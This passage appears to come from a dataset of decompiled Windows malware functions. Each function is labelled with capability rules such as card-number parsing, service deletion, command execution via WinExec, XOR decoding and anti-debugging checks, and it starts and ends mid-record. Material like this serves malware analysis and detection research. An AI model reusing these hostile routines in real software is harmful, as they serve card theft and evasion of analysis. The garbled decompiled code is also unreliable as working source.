pcVar8 = pcVar9 | &stack0xfffffffc;\n            pcVar9 = pcVar8 + 1;\n            cVar2 = pcVar1 >> 0x10;\n            *pcVar8 = cVar2;\n            uVar4 = cVar2 + (pcVar1 >> 0x18) * 'y';\n            cVar2 = in_ES;\n        }\n        iVar7 = (iVar7 - uVar4 & 0xffff) - 1;\n    }\n    else {\n        iVar7 = iVar7 - uVar4;\n    }\n    iVar7 = iVar7 + arg_ch;\n    *arg_14h = iVar7;\n    if ((iVar7 < 0) || (iVar7 >= 0)) {\n        uVar4 = uVar5;\n        arg_14h = arg_10h;\n        pcVar9 = unaff_EDI;\n    }\n    pcVar9[0x5e] = pcVar9[0x5e] + cVar2 + (0x7403ba74 < uVar4);\n    *arg_14h = *(uVar4 + 0x8bfc45e3);\n    return;\n}\n",
        "token_count": 671
    },
    "00401720": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00401720(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4235ac == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404250(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4113dc, acStack1304, &uStack2112);\n    uStack2088 = 0x411464;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x41147c;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401670(auStack1564, 0x4113d8, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1866
    },
    "00401970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00401970(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004035a0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407024;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 217
    },
    "004019d0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004019d0(uint arg_8h, uint arg_ch)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00403640(hSCManager, arg_8h);\n    uVar1 = fcn.004010e0(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "004022a0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402381) overlaps instruction at (ram,0x0040237e)\n// \n// WARNING: Removing unreachable block (ram,0x004023dd)\n// WARNING: Removing unreachable block (ram,0x004023e3)\n// WARNING: Removing unreachable block (ram,0x004023e4)\n// WARNING: Removing unreachable block (ram,0x004023ec)\n// WARNING: Removing unreachable block (ram,0x00402378)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.004022a0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort extraout_DX;\n    ushort uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint *puVar6;\n    uchar uVar7;\n    unkbyte6 Var8;\n    uchar uStack612;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint auStack92 [11];\n    uint uStack48;\n    ushort uStack44;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    fcn.00404cf0();\n    iVar2 = fcn.00401a80();\n    if (iVar2 != 0) {\n        uStack612 = 0;\n        puVar6 = &uStack611;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &uStack612, 0x26, 0);\n        if (iVar2 != 0) {\n            fcn.00404380();\n            uStack352 = 0;\n            puVar6 = &uStack351;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            *puVar6 = 0;\n            *(puVar6 + 2) = 0;\n    // WARNING: Bad instruction - Truncating control flow here\n            (*_sym.imp.MSVCRT.dll_sprintf)(&uStack352, 0x4114a4, &uStack612, 0x411484, 3);\n            iStack24 = 0;\n            pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n            do {\n                puVar6 = auStack92;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                uStack20 = 0;\n                auStack92[0] = 0x44;\n                uStack16 = 0;\n                uStack48 = 1;\n                uStack12 = 0;\n                uStack44 = 0;\n                uStack8 = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &uStack352, 0, 0, 0, 0, 0, 0, auStack92, &uStack20);\n                if (iVar2 == 0) {\n                    return;\n                }\n                (*pcVar4)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00402180, uStack12);\n                Var8 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack20, 1000);\n                uVar3 = Var8 >> 0x20;\n                uVar7 = Var8 == 0x102;\n                if (uVar7) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack20, 1);\n                    uVar3 = extraout_DX;\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                pcVar5 = pcVar4;\n                if ((!uVar7) && (uVar7)) {\n                    pcVar5 = pcVar4 + 1;\n                    out(*pcVar4, uVar3);\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack16);\n                (*pcVar1)(uStack20);\n                iStack24 = iStack24 + 1;\n                pcVar4 = pcVar5;\n            } while (iStack24 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1059
    },
    "00402680": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402680(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402550(&var_68h, &var_4h);\n    fcn.004042c0(&var_68h, var_4h, 0x407028, 0xa0e0);\n    *arg_8h = 0x407028;\n    *arg_ch = 0xa0e0;\n    return;\n}\n",
        "token_count": 240
    },
    "00403640": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00403640(uint hSCManager, uint lpServiceName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    \n    if (!in_CF && !in_ZF) {\n        if (in_CF || in_ZF) {\n            if (!in_OF) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            fcn.00401720();\n            uVar1 = (*_sym.imp.USER32.dll_DefWindowProcA)(hSCManager, unaff_ESI, in_stack_0000000c, in_stack_00000010);\n            return uVar1;\n        }\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar1 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar2);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return uVar1;\n}\n",
        "token_count": 289
    },
    "00402550": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402557) overlaps instruction at (ram,0x00402556)\n// \n\nulong __fastcall fcn.00402550(int32_t param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint uVar5;\n    char *in_EAX;\n    uint8_t uVar6;\n    uint extraout_EDX;\n    uint16_t unaff_BX;\n    uint *puVar7;\n    uint *puVar8;\n    uchar *unaff_ESI;\n    uchar *arg_ch;\n    uint *unaff_EDI;\n    bool in_PF;\n    uint8_t in_AF;\n    bool bVar9;\n    bool bVar10;\n    uint *puStackY40;\n    uint in_stack_ffffffe4;\n    char cVar11;\n    ushort in_stack_ffffffe8;\n    \n    cVar11 = in_stack_ffffffe8;\n    uVar6 = unaff_BX;\n    puVar8 = &stack0xfffffffc;\n    puVar7 = &stack0xfffffffc;\n    if (in_PF) goto code_r0x00402575;\n    puVar7 = &stack0xfffffffc;\n    if (!in_PF) goto code_r0x00402575;\n    do {\n        cVar11 = in_stack_ffffffe8;\n        uVar6 = unaff_BX;\n        arg_ch = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar8 = puVar8 - *(puVar8 + 0x5f9dff63);\n        if (puVar8 < 0) {\n            if (puVar8 == NULL) {\n                return CONCAT44(param_2, in_EAX);\n            }\n            bVar10 = (POPCOUNT((unaff_BX ^ param_1) & 0xff) & 1U) == 0;\n            *(in_EAX + 0x58) = puVar8[3];\n            if (!bVar10) {\ncode_r0x00402516:\n                if (bVar10) {\n                    puVar7 = &stack0xfffffff0;\n                    cVar11 = '\\x1e';\n                    do {\n                        puVar8 = puVar8 + -1;\n                        puVar7 = puVar7 + -1;\n                        *puVar7 = *puVar8;\n                        cVar11 = cVar11 + -1;\n                    } while ('\\0' < cVar11);\n                    uVar5 = in(0x78);\n                    return CONCAT44(param_2, uVar5);\n                }\n            }\n            fcn.00403440(puVar8[2], arg_ch, puVar8 + -1, puVar8 + 3);\n            return CONCAT44(extraout_EDX, 1);\n        }\n        bVar10 = arg_ch < 0;\n        bVar9 = arg_ch == NULL;\n        in_PF = (POPCOUNT(arg_ch & 0xff) & 1U) == 0;\n        puVar7 = puVar8;\n        if (bVar10) {\ncode_r0x00402575:\n            puVar8 = puVar7;\n            puVar2 = puVar8[2];\n            *puVar2 = 0x2a;\n            arg_ch = puVar2;\n            if ((!in_PF) && (in_PF)) {\n                arg_ch = *unaff_EDI;\n                *unaff_EDI = puVar2;\n                puVar8 = puVar8 - *(puVar8 + 0x5f9dff63);\n                bVar10 = (POPCOUNT(puVar8 & 0xff) & 1U) == 0;\n                if (puVar8 < 0) goto code_r0x00402516;\n                if (-1 < arg_ch) goto code_r0x004025f1;\n            }\n            arg_ch[1] = 0x4c;\n            arg_ch[2] = 0xd1;\n            in_stack_ffffffe8 = param_2;\n            uVar6 = param_1 >> 8 ^ uVar6;\n            bVar10 = uVar6 << 8 < 0;\n            bVar9 = uVar6 == 0;\n            arg_ch[3] = 0x72;\n            if (!bVar9 && !bVar10) goto code_r0x004025cb;\ncode_r0x004025db:\n            arg_ch[4] = 0x31;\n            puStackY40 = puVar8;\n            in_stack_ffffffe4 = param_2;\n            cVar11 = param_1;\ncode_r0x004025f1:\n            iVar3 = puStackY40[2];\n            *(iVar3 + 5) = 0x82;\n            *(iVar3 + 6) = 0x93;\n            bVar10 = (cVar11 - 5U & 0x44) != 0;\n            *(iVar3 + 7) = 0x41;\n            if ((bVar10) && (!bVar10)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            *(iVar3 + 8) = 200;\n            puVar8 = puStackY40[3];\n            *puVar8 = 9;\n            return CONCAT44(in_stack_ffffffe4, puVar8);\n        }\ncode_r0x004025cb:\n        if (!bVar9 && !bVar10) goto code_r0x004025db;\n        in_AF = 9 < (in_EAX & 0xf) | in_AF;\n        uVar6 = in_EAX + in_AF * '\\x06';\n        uVar4 = uVar6 & 0xf;\n        in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, uVar6) & 0xff0f;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        unaff_BX = pe_dos_header;\n        *in_EAX = *in_EAX + uVar4;\n        puVar1 = in_EAX + -0x74f06f70;\n        uVar6 = *puVar1;\n        *puVar1 = *puVar1 + param_2;\n        *in_EAX = *in_EAX + uVar4 + CARRY1(uVar6, param_2);\n        *in_EAX = *in_EAX + uVar4;\n        unaff_ESI = arg_ch;\n    } while( true );\n}\n",
        "token_count": 1476
    },
    "00403d90": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e65) overlaps instruction at (ram,0x00403e60)\n// \n// WARNING: Removing unreachable block (ram,0x00403fd3)\n// WARNING: Removing unreachable block (ram,0x00403ef1)\n// WARNING: Removing unreachable block (ram,0x00403e0f)\n// WARNING: Removing unreachable block (ram,0x00404002)\n\nulong __cdecl fcn.00403d90(uint32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    uint uVar4;\n    uint8_t uVar5;\n    int32_t in_ECX;\n    ushort uVar6;\n    int32_t *in_EDX;\n    uint unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t unaff_ESI;\n    uint32_t uVar9;\n    uint16_t unaff_DI;\n    uint32_t *puVar10;\n    uint16_t in_ES;\n    uint8_t in_AF;\n    bool bVar11;\n    float10 in_ST0;\n    float10 in_ST1;\n    uint auStack34 [2];\n    ushort uStack26;\n    ushort uStack24;\n    uint8_t uStack22;\n    int16_t iStack20;\n    int16_t iStack18;\n    \n    puVar8 = &stack0xfffffffc;\n    iStack20 = in_ECX;\n    bVar11 = (iStack20 - 1U & unaff_DI | 0x61be) < 0;\n    *arg_8h = 0x2e;\n    if ((bVar11) || (!bVar11)) {\n        *(arg_8h + 1) = 0x84;\n        uStack22 = unaff_EBX;\n        uStack26 = unaff_ESI;\n        uStack24 = unaff_ESI >> 0x10;\n        uVar6 = in_ECX >> 0x10;\n        iStack18 = iStack20;\n    }\n    else {\n        *(in_EAX + 0x8316dbec) = in_ST0;\n        iStack18 = unaff_EBX >> 0x10;\n        uVar3 = in_EAX - 1;\n        uVar5 = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + uVar5 * '\\x06';\n        in_EAX = in_EAX - 1 & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | uVar5 * (0xf9 < uVar3)) * '`';\n        *in_EDX = *in_EDX + 0x47c6df84;\n        *(unaff_ESI + 0x66565351) = *(unaff_ESI + 0x66565351) + in_EAX;\n        uVar6 = in_ECX + -1 >> 0x10;\n        in_ST0 = in_ST1;\n    }\n    *(arg_8h + 2) = 0xd2;\n    puVar10 = arg_8h;\n    if ((in_EDX <= (unaff_ESI | 0x561b)) && ((unaff_ESI | 0x561b) < in_EDX)) {\n        out(0xc4, in_EAX);\n        in_EDX = in_EDX & 0xffffff00 | in_EDX ^ iStack18;\n        puVar10 = arg_8h + 1;\n        *arg_8h = in_EAX;\n    }\n    *(puVar10 + 3) = 0x27;\n    *(puVar10 + 1) = 0xda;\n    bVar11 = (POPCOUNT(iStack18 >> 8 ^ uStack22) & 1U) == 0;\n    *(puVar10 + 5) = 0x5a;\n    if ((bVar11) || (!bVar11)) {\n        *(puVar10 + 6) = 2;\n    }\n    uVar9 = CONCAT22(uStack24, uStack26) + 0x47;\n    bVar11 = (POPCOUNT(in_EAX + -1) & 1U) == 0;\n    *(puVar10 + 7) = 0xc1;\n    if ((bVar11) || (!bVar11)) {\n        *(puVar10 + 2) = 0xcc;\n    }\n    else {\n        uVar9 = 0x34a96cf4;\n        puVar8 = *0xc617b43a;\n        puVar10 = puVar10 + 1;\n        in_EDX = (in_EAX >> 8 & 0xffff00) << 8 | in_ES;\n    }\n    iVar1 = puVar8[2];\n    *(iVar1 + 9) = 0x83;\n    bVar11 = -1 < (uVar9 | 0x561b) - in_EDX;\n    *(iVar1 + 10) = 0xca;\n    if ((bVar11) && (!bVar11)) {\n        *(puVar10 + 7) = in_ST0;\n    }\n    *(iVar1 + 0xb) = 0xe0;\n    bVar11 = (in_EDX & 0x1200) != 0;\n    iVar1 = puVar8[2];\n    *(iVar1 + 0xc) = 0x4a;\n    if ((bVar11) && (!bVar11)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(iVar1 + 0xd) = 0xbe;\n    *(iVar1 + 0xe) = 0x3e;\n    while( true ) {\n        iVar1 = puVar8[2];\n        *(iVar1 + 0xf) = 0x5b;\n        *(iVar1 + 0x10) = 0x9c;\n        *(iVar1 + 0x11) = 0xc0;\n        uVar5 = iStack18 - 5 & 0x44;\n        bVar11 = (POPCOUNT(uVar5) & 1U) != 0;\n        *(iVar1 + 0x12) = 0x8c;\n        if ((uVar5 == 0) || (uVar5 != 0)) break;\n        if (CONCAT22(uVar6, iStack18) != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(iVar1 + 0x13) = 0xb1;\n    if ((bVar11) && (!bVar11)) {\n        puVar7 = auStack34 + 1;\n        cVar2 = '\\x1e';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar8;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar4 = in(0x78);\n        return CONCAT44(in_EDX, uVar4);\n    }\n    *(iVar1 + 0x14) = 0x13;\n    *(iVar1 + 0x15) = 0x29;\n    iVar1 = puVar8[2];\n    *(iVar1 + 0x16) = 0x27;\n    *puVar8[3] = 0x17;\n    return CONCAT44(in_EDX, iVar1);\n}\n",
        "token_count": 1702
    },
    "004042c0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004042c0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_14h != 0) {\n        do {\n            *(var_4h + arg_10h) = *(var_4h + arg_10h) ^ *(var_4h % arg_ch + arg_8h);\n            var_4h = var_4h + 1;\n        } while (var_4h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "004028a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004028cd)\n// WARNING: Removing unreachable block (ram,0x004028db)\n// WARNING: Removing unreachable block (ram,0x004028dd)\n// WARNING: Removing unreachable block (ram,0x00402897)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.004028a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404380();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403570();\n        arg_ch_01 = fcn.00403570();\n        arg_ch_02 = fcn.00403570();\n        fcn.00404250(arg_10h, arg_ch_00);\n        fcn.00404250(arg_8h, arg_ch_01);\n        fcn.00404250(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x41111c, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401600(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411128, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401600(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411128, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401600(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404250(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 692
    },
    "00403310": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033e7) overlaps instruction at (ram,0x004033e6)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403310(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    uchar uVar4;\n    uint32_t in_EAX;\n    uint *puVar5;\n    uint8_t extraout_CL;\n    int32_t iVar6;\n    char extraout_DH;\n    int32_t unaff_EBX;\n    uint32_t uVar7;\n    uint *unaff_EDI;\n    uint *puVar8;\n    uint8_t in_AF;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    if ((*0x10 == 0x28) || (*0x10 != 0x28)) {\ncode_r0x0040332d:\n        puVar5 = fcn.00402bf0(arg_18h, arg_1ch, 0x41114c, 7);\n        if (puVar5 == NULL) {\n            return 0;\n        }\n        var_4h = puVar5;\n        if ((0 < puVar5) && (puVar5 < 1)) {\n            *(puVar5 + -0x46c625aa) = *(puVar5 + -0x46c625aa) ^ extraout_CL;\n            *puVar5 = *puVar5 + puVar5;\n            *(unaff_EBX + 1) = *(unaff_EBX + 1) + extraout_DH;\n            puVar8 = unaff_EDI + 1;\n            *unaff_EDI = puVar5;\n            goto code_r0x00403384;\n        }\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        if (0x23 < &stack0xfffffffc && unaff_EBX != 0) {\n            uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n            piVar1 = (in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, in_EAX + uVar2 * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - unaff_EBX;\n            goto code_r0x0040332d;\n        }\n    }\n    puVar5 = NULL;\n    puVar8 = &var_23h;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\ncode_r0x00403384:\n    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n    *puVar8 = puVar5;\n    *(puVar8 + 2) = puVar5;\n    uVar7 = 0;\n    do {\n        uVar4 = (*pcVar3)();\n        (&var_24h)[uVar7] = uVar4;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x20);\n    puVar5 = &var_24h;\n    puVar8 = var_4h;\n    for (iVar6 = 8; iVar6 != 